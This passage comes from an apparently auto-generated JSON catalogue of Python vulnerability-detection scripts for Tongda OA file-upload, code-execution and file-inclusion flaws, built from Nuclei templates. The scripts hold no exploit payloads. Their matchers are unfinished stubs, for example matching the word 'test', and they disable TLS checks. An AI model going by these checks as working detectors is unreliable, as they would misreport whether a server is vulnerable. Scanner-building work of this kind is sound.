        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tongda-action-uploadfile\nName: Tongda OA v2017 action_upload - Arbitrary File Upload\nSeverity: critical\nDescription: Tongda OA v2017 action_upload.php file filtering is insufficient and does not require background permissions, resulting in arbitrary file upload vulnerabilities\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tongda_action_uploadfile:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tongda-action-uploadfile\"\n    SEVERITY = \"critical\"\n    NAME = \"Tongda OA v2017 action_upload - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(string)}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tongda OA v2017 action_upload - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tongda_action_uploadfile(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "tongda",
          "fileupload",
          "intrusive",
          "router",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_tongda_api_file_upload",
        "name": "Tongda OA v11.8 api.ali.php - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Tongda OA v11.8 api.ali.php has an arbitrary file upload vulnerability. An attacker can upload malicious files to control the server through the vulnerability.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200; contains(body_2,\"+OK\") && contains(body_3,\"phpinfo\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tongda-api-file-upload\nName: Tongda OA v11.8 api.ali.php - Arbitrary File Upload\nSeverity: critical\nDescription: Tongda OA v11.8 api.ali.php has an arbitrary file upload vulnerability. An attacker can upload malicious files to control the server through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tongda_api_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tongda-api-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Tongda OA v11.8 api.ali.php - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200; contains(body_2,\"+OK\") && contains(body_3,\"phpinfo\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tongda OA v11.8 api.ali.php - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tongda_api_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tongda-api-file-upload\nName: Tongda OA v11.8 api.ali.php - Arbitrary File Upload\nSeverity: critical\nDescription: Tongda OA v11.8 api.ali.php has an arbitrary file upload vulnerability. An attacker can upload malicious files to control the server through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tongda_api_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tongda-api-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Tongda OA v11.8 api.ali.php - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200; contains(body_2,\"+OK\") && contains(body_3,\"phpinfo\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tongda OA v11.8 api.ali.php - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tongda_api_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "tongda",
          "oa",
          "fileupload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_tongda_getdata_rce",
        "name": "Tongda OA v11.9 getadata - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is an arbitrary command execution vulnerability in the getdata interface of Tongda OA v11.9. An attacker can execute arbitrary commands on the server to control server permissions through the vulnerability.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{md5(num)}}, pagelimit' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "num",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num",
            "default": "999999999"
          },
          {
            "name": "payload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: payload",
            "default": "echo md5({{num}});"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tongda-getdata-rce\nName: Tongda OA v11.9 getadata - Remote Code Execution\nSeverity: critical\nDescription: There is an arbitrary command execution vulnerability in the getdata interface of Tongda OA v11.9. An attacker can execute arbitrary commands on the server to control server permissions through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tongda_getdata_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tongda-getdata-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Tongda OA v11.9 getadata - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(num)}}, pagelimit' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(num)}}, pagelimit']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tongda OA v11.9 getadata - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tongda_getdata_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tongda-getdata-rce\nName: Tongda OA v11.9 getadata - Remote Code Execution\nSeverity: critical\nDescription: There is an arbitrary command execution vulnerability in the getdata interface of Tongda OA v11.9. An attacker can execute arbitrary commands on the server to control server permissions through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tongda_getdata_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tongda-getdata-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Tongda OA v11.9 getadata - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(num)}}, pagelimit' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(num)}}, pagelimit']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tongda OA v11.9 getadata - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tongda_getdata_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "tongda",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_tongda_getway_rfi",
        "name": "Tongda OA v11.8 getway.php - Remote File Inclution",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is a file inclusion vulnerability in Tongda OA v11.8 getway.php, an attacker sends a malicious request to include a log file, resulting in an arbitrary file writing vulnerability",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body_1, \"ERROR URL\"); contains(body_2, 'GET') || contains(body_2, 'POST')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
